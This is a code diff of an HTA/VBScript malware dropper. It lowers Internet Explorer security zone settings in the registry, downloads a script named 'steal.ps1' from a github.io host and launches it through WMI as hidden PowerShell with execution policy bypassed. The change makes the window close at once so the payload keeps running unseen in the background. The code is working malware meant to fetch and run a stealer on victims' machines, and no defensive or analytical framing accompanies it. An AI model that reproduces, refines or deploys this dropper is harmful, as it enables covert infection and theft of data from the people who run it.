@@ -17,7 +17,7 @@ sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zo
 sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"
 sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201", 0, "REG_DWORD"
 
-' Download the script
+' Download steal.ps1
 xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
 xh.Send
 
@@ -30,20 +30,18 @@ If xh.Status = 200 Then
     f.Write ps1Content
     f.Close
 
-    ' Run via WMI
-    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
+    ' Run via WMI. WMI will spawn powershell.
     Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
     Dim proc: Set proc = wmi.Get("Win32_Process")
+    
+    ' We use "powershell.exe -WindowStyle Hidden" to hide the black box
+    Dim finalCmd : finalCmd = "powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
+    
     proc.Create finalCmd, Null, Null
-    
-    ' Wait 10 seconds for it to send
-    Dim w: w = Timer()
-    Do While Timer() - w < 10
-    Loop
-    
-    fso.DeleteFile tempPs1, True
 End If
 
+' KILL THE HTA IMMEDIATELY
+' We don't wait. The script is running in the background via WMI.
 window.close()
 </script>
 </head><body></body></html>
